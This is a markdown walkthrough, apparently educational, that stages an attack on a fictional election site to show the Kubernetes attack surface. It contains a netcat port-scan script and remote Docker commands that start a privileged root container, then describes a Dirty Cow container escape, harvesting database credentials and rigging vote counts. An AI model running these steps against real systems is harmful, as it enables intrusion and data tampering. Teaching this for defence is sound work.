# Understand Kubernetes Attack Surface Through a Demo Attack

## History
- In the elections between CATS and DOGS, Dogs have been winning elections for quite some time.
- The cats team decides to hack the systems and announce Cats have won the election by a massive majority.

Data that is available publicly are:
- Domains:
  - www.vote.com
  - www.result.com
- Both the domains respond to ping
  - This indicates the domains are hosted in the same server/infrastructure:
```
ping votes.com
pint results.com
```
    
![image](https://github.com/user-attachments/assets/68fd033e-03b2-4ba7-804b-136cce98081e)

### When performing the port-scan it reveals the ports which are exposed/vulnerable
```
cat port-scan.sh

#!/bin/bash

# Check if an IP address is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <host>"
    exit 1
fi

HOST=$1

# List of common ports to scan
declare -A PORTS
PORTS=(
    [21]="ftp"
    [22]="ssh"
    [23]="telnet"
    [25]="smtp"
    [53]="dns"
    [80]="http"
    [110]="pop3"
    [111]="rpcbind"
    [135]="msrpc"
    [139]="netbios-ssn"
    [143]="imap"
    [443]="https"
    [445]="ms-ds"
    [993]="imaps"
    [995]="pop3s"
    [1723]="pptp"
    [2375]="docker"
    [3306]="mysql"
    [3389]="ms-wbt"
    [5900]="vnc"
)

echo "Scanning host $HOST..."

# Loop through the ports and check their status
for PORT in "${!PORTS[@]}"; do
    SERVICE=${PORTS[$PORT]}
    echo -n "Scanning port $PORT for $SERVICE ... "

    # Use nc (netcat) to check if the port is open
    nc -z -w 1 $HOST $PORT &> /dev/null
    if [ $? -eq 0 ]; then
        echo "Success"
    else
        echo "Fail"
    fi
done

# sh port-scan.sh  104.21.63.124
```

The scan results shows the docker port is exposed.
- This points to the fact that the security is disabled for docker service running in the infra.
![image](https://github.com/user-attachments/assets/b92314d6-ceea-476f-88bc-e42112319bcc)

### To verify the access ran the docker ps command:

```
# docker -H www.vote.com ps -a
```
- This lists the containers running within the host.
![image](https://github.com/user-attachments/assets/fd766a0b-5509-4a4c-8a2b-3ac3f130ce23)

- The docker version is also available:
```
# docker -H www.vote.com version
```
![image](https://github.com/user-attachments/assets/8fac0187-67cf-4e2b-8447-afdb43d64a96)


### Now the hacker creates a privileged container to act as a Jump-server
```
# docker -H  www.vote.com  run  --privileged  -it  ubuntu bash
root@new-container:/# 
```
- Then installs the curl/wget packages to run the custom scripts to attack the env

![image](https://github.com/user-attachments/assets/716028be-caa8-4a65-8a88-f5cff43131af)

- Now the attacker downloads the Dirty-Cow exploit script:
- And runs it to escape out of the container onto the underlying Host:

![image](https://github.com/user-attachments/assets/7fda2ccc-f622-4d5b-b101-6e1a4224bd9d)

### Runs the script to access the underlying Host terminal

![image](https://github.com/user-attachments/assets/76a1c2f9-ee72-4d7a-9c70-05748c3ec9d4)

![image](https://github.com/user-attachments/assets/da9e7fa5-6d67-4e59-880a-d4f5448bebe2)

- At this point, the attacker can infiltrate into the rest of the network 

![image](https://github.com/user-attachments/assets/69f2753c-9d5f-45ae-a403-84aec33dc382)

- In the docker ps output shows that the containers include K8s - Kubernetes dashboard containers:

![image](https://github.com/user-attachments/assets/39fcd5f5-dcff-4565-bf79-9d0043e6f785)

- To identify the port associated with the K8s dashboard - the attacker can check the IPTables Nat chain
- The port exposed is 30080.

![image](https://github.com/user-attachments/assets/1f9084d7-817a-423a-9076-0f24f5703e8b)

- The K8s dashboard is available in the URL 104.21.63.124:30080
- The dashboard gives information about the entire cluster.

![image](https://github.com/user-attachments/assets/976871b8-c1d9-4483-9420-bd154a8f5b84)

- The results are saved in the db database, which contains the password details as environment variables:

![image](https://github.com/user-attachments/assets/d5e81651-b823-4af7-8cf5-644227fae712)

- Now the attacker identifies the database container and execs into it:

![image](https://github.com/user-attachments/assets/05f63812-7559-42ad-9dd5-2dd0c52a0694)

- Once in, the attacker uses the Username and password to connect to the DB
![image](https://github.com/user-attachments/assets/e73a972a-00c1-4cfa-bbee-303e12f46a02)

- Now she updates the votes of Doga and cats using the script

![image](https://github.com/user-attachments/assets/0eeb8517-fb75-407c-8d54-c341b589fb01)

- Now the results are successfully manipulated:

![image](https://github.com/user-attachments/assets/68f2c1db-b2ed-4898-a41d-46b66965e5ad)
